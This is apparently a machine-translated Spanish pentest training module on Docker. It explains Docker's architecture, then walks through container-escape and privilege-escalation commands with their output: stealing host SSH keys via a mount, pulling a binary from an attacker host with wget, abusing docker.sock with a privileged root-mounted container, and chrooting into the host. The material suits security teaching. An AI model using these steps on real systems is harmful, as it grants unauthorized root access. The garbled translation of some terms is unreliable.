# Estibador

---

Docker es una herramienta popular de código abierto que proporciona un entorno de tiempo de ejecución portátil y consistente para aplicaciones de software. Utiliza contenedores como entornos aislados en el espacio de usuario que se ejecutan a nivel del sistema operativo y comparten el sistema de archivos y los recursos del sistema. Una ventaja es que la contenedores consume, por lo tanto, consume significativamente menos recursos que un servidor tradicional o una máquina virtual. La característica central de Docker es que las aplicaciones están encapsuladas en los llamados contenedores Docker. Por lo tanto, se pueden usar para cualquier sistema operativo. Un contenedor Docker representa un paquete de software ejecutable independiente ligero que contiene todo lo necesario para ejecutar un tiempo de ejecución del código de aplicación.

---

## Arquitectura de acopolador

En el núcleo de la arquitectura Docker se encuentra un modelo de cliente cliente, donde tenemos dos componentes principales:

- El Docker Daemon
- El cliente de Docker

El cliente Docker actúa como nuestra interfaz para emitir comandos e interactuar con el ecosistema Docker, mientras que el Docker Daemon es responsable de ejecutar esos comandos y administrar contenedores.

#### Docker Daemon

El`Docker Daemon`, también conocido como Docker Server, es una parte crítica de la plataforma Docker que juega un papel fundamental en la gestión y la orquestación de contenedores. Piense en el Docker Daemon como la potencia detrás de Docker. Tiene varias responsabilidades esenciales como:

- Ejecutando contenedores Docker
    
- Interactuar con contenedores Docker
    
- Administración de contenedores Docker en el sistema de host.
    

#### Gestión de contenedores Docker

En primer lugar, maneja la funcionalidad de contenedorización del núcleo. Coordina la creación, ejecución y monitoreo de contenedores Docker, manteniendo su aislamiento del huésped y otros contenedores. Este aislamiento garantiza que los contenedores funcionen de forma independiente, con sus propios sistemas de archivos, procesos e interfaces de red. Además, maneja la gestión de imágenes de Docker. Extrae imágenes de registros, como[Centro de acopolador](https://hub.docker.com/)o repositorios privados, y los almacena localmente. Estas imágenes sirven como bloques de construcción para crear contenedores.

Además, el Docker Daemon ofrece capacidades de monitoreo y registro, por ejemplo:

- Captura registros de contenedores
    
- Proporciona información sobre actividades de contenedores, errores e información de depuración.
    

El demonio también monitorea la utilización de recursos, como CPU, memoria y uso de la red, lo que nos permite optimizar el rendimiento del contenedor y la resolución de problemas.

#### Red y almacenamiento

Facilita las redes de contenedores mediante la creación de redes virtuales y la administración de interfaces de red. Permite que los contenedores se comuniquen entre sí y con el mundo exterior a través de puertos de red, direcciones IP y resolución DNS. El Docker Daemon también juega un papel fundamental en la gestión de almacenamiento, ya que maneja los volúmenes de Docker, que se utilizan para persistir datos más allá de la vida útil de los contenedores y administra la creación de volumen, el archivo adjunto y la limpieza, lo que permite que los contenedores compartan o almacenen datos independientemente de los demás.

#### Clientes de Docker

Cuando interactuamos con Docker, emitimos comandos a través del`Docker Client`, que se comunica con el Docker Daemon (a través de un`RESTful API`o`Unix socket`) y sirve como nuestro medio principal para interactuar con Docker. También tenemos la capacidad de crear, iniciar, detener, administrar, eliminar contenedores, buscar y descargar imágenes de Docker. Con estas opciones, podemos extraer imágenes existentes para usar como base para nuestros contenedores o construir nuestras imágenes personalizadas usando DockerFiles. Tenemos la flexibilidad de llevar nuestras imágenes a repositorios remotos, facilitando la colaboración y el intercambio dentro de nuestros equipos o con la comunidad en general.

En comparación, el demonio, por otro lado, lleva a cabo las acciones solicitadas, asegurando que los contenedores se creen, lanzan, se detengan y se eliminen según sea necesario.

Otro cliente para Docker es`Docker Compose`. Es una herramienta que simplifica la orquestación de múltiples contenedores Docker como una sola aplicación. Nos permite definir la arquitectura de contenedores múltiples de nuestra aplicación utilizando un declarante`YAML` (`.yaml`/`.yml`) archivo. Con él, podemos especificar los servicios que comprenden nuestra aplicación, sus dependencias y sus configuraciones. Definimos imágenes de contenedores, variables de entorno, redes, enlaces de volumen y otras configuraciones. Docker Compose luego asegura que todos los contenedores definidos sean lanzados e interconectados, creando una pila de aplicaciones cohesivas y escalables.

#### Escritorio de Docker

`Docker Desktop`está disponible para sistemas operativos MacOS, Windows y Linux y nos proporciona una GUI fácil de usar que simplifica la administración de contenedores y sus componentes. Esto nos permite monitorear el estado de nuestros contenedores, inspeccionar registros y administrar los recursos asignados a Docker. Proporciona una forma intuitiva y visual de interactuar con el ecosistema Docker, por lo que es accesible para los desarrolladores de todos los niveles de experiencia, y además, admite Kubernetes.

---

## Imágenes y contenedores de Docker

Piense en un`Docker image`como un plan o una plantilla para crear contenedores. Encapsula todo lo necesario para ejecutar una aplicación, incluido el código, las dependencias, las bibliotecas y las configuraciones de la aplicación. Una imagen es un paquete autónomo y de solo lectura que garantiza la consistencia y la reproducibilidad en diferentes entornos. Podemos crear imágenes usando un archivo de texto llamado`Dockerfile`, que define los pasos e instrucciones para construir la imagen.

A`Docker container`es una instancia de una imagen de Docker. Es un entorno ligero, aislado y ejecutable que ejecuta aplicaciones. Cuando lanzamos un contenedor, se crea a partir de una imagen específica, y el contenedor hereda todas las propiedades y configuraciones definidas en esa imagen. Cada contenedor opera de forma independiente, con su propio sistema de archivos, procesos e interfaces de red. Este aislamiento garantiza que las aplicaciones dentro de los contenedores permanezcan separadas del sistema de host subyacente y otros contenedores, evitando conflictos e interferencias.

Mientras`images`son inmutables y`read-only`, `containers`son mutables y`can be modified`durante el tiempo de ejecución. Podemos interactuar con contenedores, ejecutar comandos dentro de ellos, monitorear sus registros e incluso hacer cambios en su sistema de archivos o entorno. Sin embargo, las modificaciones realizadas al sistema de archivos de un contenedor no se persisten a menos que se guarden explícitamente como una nueva imagen o se almacenan en un volumen persistente.

---

## Escalada de privilegios de Docker

Lo que puede suceder es que obtenemos acceso a un entorno en el que encontraremos usuarios que puedan administrar contenedores Docker. Con esto, podríamos buscar formas de usar esos contenedores Docker para obtener mayores privilegios en el sistema objetivo. Podemos usar varias formas y técnicas para aumentar nuestros privilegios o escapar del contenedor Docker.

#### Directorios compartidos de Docker

Al usar Docker, los directorios compartidos (montajes de volumen) pueden cerrar la brecha entre el sistema de host y el sistema de archivos del contenedor. Con directorios compartidos, directorios o archivos específicos en el sistema de host se pueden hacer accesibles dentro del contenedor. Esto es increíblemente útil para persistir datos, compartir código y facilitar la colaboración entre entornos de desarrollo y contenedores Docker. Sin embargo, siempre depende de la configuración del entorno y de los objetivos que los administradores desean lograr. Para crear un directorio compartido, se especifica una ruta en el sistema host y una ruta correspondiente dentro del contenedor, creando un enlace directo entre las dos ubicaciones.

Los directorios compartidos ofrecen varias ventajas, incluida la capacidad de persistir datos más allá de la vida útil de un contenedor, simplificar el intercambio y desarrollo de códigos, y habilitar la colaboración dentro de los equipos. Es importante tener en cuenta que los directorios compartidos se pueden montar como solo lectura o de lectura, dependiendo de los requisitos específicos del administrador. Cuando se monta como de solo lectura, las modificaciones realizadas dentro del contenedor no afectarán el sistema de host, lo cual es útil cuando se prefiere el acceso de solo lectura para evitar modificaciones accidentales.

Cuando obtenemos acceso al contenedor Docker y lo enumeramos localmente, podríamos encontrar directorios adicionales (no estándar) en el sistema de archivos del Docker.

  Estibador

```shell-session
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

De aquí en adelante, podríamos copiar el contenido de la clave SSH privada para`cry0l1t3.priv`archivo y usarlo para iniciar sesión como usuario`cry0l1t3`en el sistema de host.

  Docker

```shell-session
xnoxos@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

#### Sockets Docker

Un Socket de Docker o Docker Daemon Socket es un archivo especial que nos permite y procesos para comunicarnos con Docker Daemon. Esta comunicación ocurre a través de un socket unix o un enchufe de red, dependiendo de la configuración de nuestra configuración de Docker. Actúa como un puente, facilitando la comunicación entre el cliente Docker y el Docker Daemon. Cuando emitimos un comando a través de la CLI Docker, el cliente Docker envía el comando al socket Docker, y el Docker Daemon, a su vez, procesa el comando y lleva a cabo las acciones solicitadas.

Sin embargo, los enchufadores requieren permisos apropiados para garantizar una comunicación segura y evitar el acceso no autorizado. El acceso al socket de Docker generalmente está restringido a usuarios o grupos de usuarios específicos, asegurando que solo las personas de confianza puedan emitir comandos e interactuar con Docker Daemon. Al exponer el socket de Docker en una interfaz de red, podemos administrar remotamente los hosts de Docker, emitir comandos y controlar contenedores y otros recursos. Este acceso remoto de la API amplía las posibilidades de configuraciones distribuidas de Docker y escenarios de gestión remota. Sin embargo, dependiendo de la configuración, hay muchas formas en que se pueden almacenar procesos o tareas automatizadas. Esos archivos pueden contener información muy útil para nosotros que podemos usar para escapar del contenedor Docker.

  Estibador

```shell-session
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

De aquí en adelante, podemos usar el`docker`Binario para interactuar con el enchufe y enumerar lo que los contenedores Docker ya están funcionando. Si no está instalado, entonces podemos descargarlo[aquí](https://master.dockerproject.org/linux/x86_64/docker)y subirlo al contenedor Docker.

  Estibador

```shell-session
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

Podemos crear nuestro propio contenedor Docker que mapea el directorio raíz del host (`/`) hacia`/hostsystem`directorio en el contenedor. Con esto, tendremos acceso completo al sistema de host. Por lo tanto, debemos mapear estos directorios en consecuencia y usar el`main_app`Imagen de Docker.

  Estibador

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Ahora, podemos iniciar sesión en el nuevo contenedor de Docker privilegiado con la ID`7ae3bcc818af`y navegar al`/hostsystem`.

  Estibador

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir de ahí, podemos intentar nuevamente tomar la tecla SSH privada e iniciar sesión como root o como cualquier otro usuario en el sistema con una tecla SSH privada en su carpeta.

#### Grupo de acopolador

Para obtener privilegios raíz a través de Docker, el usuario con el que nos inició sesión debe estar en el`docker`grupo. Esto le permite usar y controlar el Docker Daemon.

  Estibador

```shell-session
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternativamente, Docker puede tener Suid establecido, o estamos en el archivo de sudoers, lo que nos permite ejecutar`docker`como raíz. Las tres opciones nos permiten trabajar con Docker para aumentar nuestros privilegios.

La mayoría de los hosts tienen una conexión a Internet directa porque las imágenes y los contenedores base deben descargarse. Sin embargo, muchos anfitriones pueden desconectarse de Internet por la noche y fuera del horario laboral por razones de seguridad. Sin embargo, si estos hosts se encuentran en una red donde, por ejemplo, un servidor web tiene que pasar, todavía se puede llegar.

Para ver a qué imágenes existen y a cuáles podemos acceder, podemos usar el siguiente comando:

  Estibador

```shell-session
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

#### Docker Socket

Un caso que también puede ocurrir es cuando el zócalo de Docker es redactado. Por lo general, este enchufe se encuentra en`/var/run/docker.sock`. Sin embargo, la ubicación puede ser comprensiblemente diferente. Porque básicamente, esto solo puede ser escrito por el grupo Root o Docker. Si actuamos como usuario, no en uno de estos dos grupos, y el Socket de Docker todavía tiene los privilegios de ser escritos, entonces aún podemos usar este caso para aumentar nuestros privilegios.

  Estibador

```shell-session
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```